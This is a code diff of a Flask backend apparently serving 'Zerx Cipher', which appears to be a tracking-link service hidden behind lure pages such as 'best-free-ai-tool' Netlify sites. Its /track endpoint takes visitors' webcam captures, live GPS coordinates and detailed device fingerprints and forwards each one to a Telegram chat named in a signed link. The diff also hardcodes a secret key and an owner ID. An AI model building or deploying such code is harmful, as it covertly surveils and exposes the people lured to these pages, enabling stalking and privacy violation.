@@ -1,22 +1,23 @@
 #!/usr/bin/env python3
 # server.py — Flask backend for Zerx Cipher
-# Endpoints: /api/verify, /api/clone/<slug>, /track, /health
+# Endpoints: /api/verify, /api/clone/<slug>, /api/clone-store, /track, /health
 # Includes permissive CORS so the Netlify-hosted pages can call it.
 
-from flask import Flask, request, jsonify, Response, make_response
+from flask import Flask, request, jsonify, Response
 import hmac, hashlib, time, sqlite3, os, json, base64
 from datetime import datetime, timezone
-from functools import wraps
 
 app = Flask(__name__)
-_CLONES = {}
 
-LINK_SECRET = os.environ.get("LINK_SECRET", "REPLACE_THIS_WITH_YOUR_RANDOM_SECRET")
+LINK_SECRET = os.environ.get("LINK_SECRET", "zE4o-jRvHuJiSbw-bg72aeygBJ-In52YqBj_oV-PuYoYlmrIhf_jhjzThgCmShLt")
 BOT_TOKEN   = os.environ.get("BOT_TOKEN", "")
 OWNER_ID    = os.environ.get("OWNER_ID", "5748713981")
 DB_PATH     = os.environ.get("DB_PATH", "zerx.db")
+DIVIDER     = "━━━━━━━━━━━━━━━━"
+FOOTER      = "⚡ Developed by: @zerxofficial"
 
-# Allowed origins for CORS (add more if needed)
+_CLONES = {}
+
 ALLOWED_ORIGINS = {
     "https://best-free-ai-tool.netlify.app",
     "https://best-free-ai-tools.netlify.app",
@@ -34,6 +35,44 @@ def add_cors(resp):
         resp.headers["Access-Control-Max-Age"] = "86400"
     return resp
 
+def _sign(payload: str) -> str:
+    return hmac.new(LINK_SECRET.encode(), payload.encode(), hashlib.sha256).hexdigest()[:32]
+
+def _flag_emoji(cc):
+    if not cc or len(cc) != 2:
+        return ""
+    try:
+        return chr(0x1F1E6 + ord(cc[0].upper()) - 65) + chr(0x1F1E6 + ord(cc[1].upper()) - 65)
+    except Exception:
+        return ""
+
+def _send_telegram_text(chat_id, text):
+    import requests as rq
+    try:
+        rq.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={"chat_id": chat_id, "text": text,
+                  "parse_mode": "HTML", "disable_web_page_preview": True},
+            timeout=12,
+        )
+    except Exception as e:
+        print(f"telegram text failed: {e}")
+
+def _send_telegram_photo(chat_id, b64_data, caption):
+    import requests as rq
+    try:
+        if "," in b64_data:
+            b64_data = b64_data.split(",", 1)[1]
+        raw = base64.b64decode(b64_data)
+        rq.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
+            files={"photo": ("capture.jpg", raw)},
+            data={"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"},
+            timeout=20,
+        )
+    except Exception as e:
+        print(f"telegram photo failed: {e}")
+
 @app.route("/api/verify", methods=["GET", "OPTIONS"])
 def api_verify():
     if request.method == "OPTIONS":
@@ -50,7 +89,7 @@ def api_verify():
         return jsonify({"ok": False, "reason": "malformed"}), 403
     if exp < int(time.time()):
         return jsonify({"ok": False, "reason": "expired"}), 403
-    expected = hmac.new(LINK_SECRET.encode(), f"{uid}.{exp}".encode(), hashlib.sha256).hexdigest()[:32]
+    expected = _sign(f"{uid}.{exp}")
     if not hmac.compare_digest(expected, sig):
         return jsonify({"ok": False, "reason": "bad_signature"}), 403
     return jsonify({"ok": True, "uid": uid})
@@ -102,31 +141,99 @@ def track():
         data = request.get_json(force=True) or {}
     except Exception:
         data = {}
+
     uid = str(data.get("uid", "")).strip()
     typ = data.get("type", "unknown")
-    payload = data.get("data", {})
+    payload = data.get("data", {}) or {}
     if not uid.isdigit():
         return jsonify({"ok": False}), 400
     if not BOT_TOKEN:
         return jsonify({"ok": True}), 200
-    import requests as rq
+
+    now = datetime.now(timezone.utc).strftime("%b %d, %Y, %I:%M %p")
+
+    # ── CAMERA ──
     if typ == "camera" and isinstance(payload, dict) and payload.get("image"):
-        try:
-            b64 = payload["image"].split(",", 1)[-1]
-            rq.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",
-                    files={"photo": ("capture.jpg", base64.b64decode(b64))},
-                    data={"chat_id": uid, "caption": f"📸 Camera — {uid}"},
-                    timeout=15)
-        except Exception:
-            pass
-    else:
-        try:
-            text = f"📡 <b>{typ}</b>\n<code>{json.dumps(payload)[:900]}</code>"
-            rq.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
-                    json={"chat_id": uid, "text": text, "parse_mode": "HTML"},
-                    timeout=10)
-        except Exception:
-            pass
+        caption = (
+            f"📸 <b>Camera Capture Received</b>\n"
+            f"{DIVIDER}\n"
+            f"📅 Captured: {now}\n"
+            f"{DIVIDER}\n"
+            f"{FOOTER}"
+        )
+        _send_telegram_photo(uid, payload["image"], caption)
+        return jsonify({"ok": True}), 200
+
+    # ── LOCATION ──
+    if typ == "location" and isinstance(payload, dict):
+        lat = payload.get("lat")
+        lon = payload.get("lon")
+        acc = payload.get("acc")
+        acc_line = f" (±{round(acc)}m)" if isinstance(acc, (int, float)) else ""
+        maps = f"https://maps.google.com/?q={lat},{lon}"
+        text = (
+            f"📍 <b>Live Location Captured</b>\n"
+            f"{DIVIDER}\n"
+            f"🎯 Coordinates: <code>{lat}, {lon}</code>{acc_line}\n"
+            f"🗺 Map: {maps}\n"
+            f"📅 Captured: {now}\n"
+            f"{DIVIDER}\n"
+            f"{FOOTER}"
+        )
+        _send_telegram_text(uid, text)
+        return jsonify({"ok": True}), 200
+
+    # ── DEVICE INFO ──
+    if typ == "device_info" and isinstance(payload, dict):
+        ua = payload.get("ua", "n/a")
+        platform = payload.get("platform", "n/a")
+        lang = payload.get("lang", "n/a")
+        screen = payload.get("screen", "n/a")
+        tz = payload.get("tz", "n/a")
+        url = payload.get("url", "n/a")
+        cores = payload.get("cores", "n/a")
+        mem = payload.get("mem", "n/a")
+        color_depth = payload.get("colorDepth", "n/a")
+        touch = payload.get("touch", "n/a")
+        touch_points = payload.get("touchPoints", "n/a")
+        cookies = payload.get("cookies", "n/a")
+        dnt = payload.get("dnt", "n/a")
+
+        text = (
+            f"📊 <b>Visitor Information Captured</b>\n"
+            f"{DIVIDER}\n"
+            f"🖥️ <b>Device &amp; Browser</b>\n"
+            f"   • Device Model: {platform}\n"
+            f"   • User Agent: {ua}\n\n"
+            f"🌐 <b>Network Information</b>\n"
+            f"   • Language: {lang}\n\n"
+            f"🖼️ <b>Display Information</b>\n"
+            f"   • Resolution: {screen}\n"
+            f"   • Color Depth: {color_depth}\n"
+            f"   • Touch: {touch} ({touch_points})\n\n"
+            f"💾 <b>Hardware &amp; Storage</b>\n"
+            f"   • CPU Cores: {cores}\n"
+            f"   • RAM: {mem} GB\n\n"
+            f"⚙️ <b>Other</b>\n"
+            f"   • Timezone: {tz}\n"
+            f"   • Cookies: {cookies}\n"
+            f"   • DNT: {dnt}\n"
+            f"   • Page URL: {url}\n\n"
+            f"{DIVIDER}\n"
+            f"{FOOTER}"
+        )
+        _send_telegram_text(uid, text)
+        return jsonify({"ok": True}), 200
+
+    # ── FALLBACK ──
+    text = (
+        f"📡 <b>{typ}</b>\n"
+        f"{DIVIDER}\n"
+        f"<code>{json.dumps(payload)[:900]}</code>\n"
+        f"{DIVIDER}\n"
+        f"{FOOTER}"
+    )
+    _send_telegram_text(uid, text)
     return jsonify({"ok": True}), 200
 
 @app.route("/health", methods=["GET"])
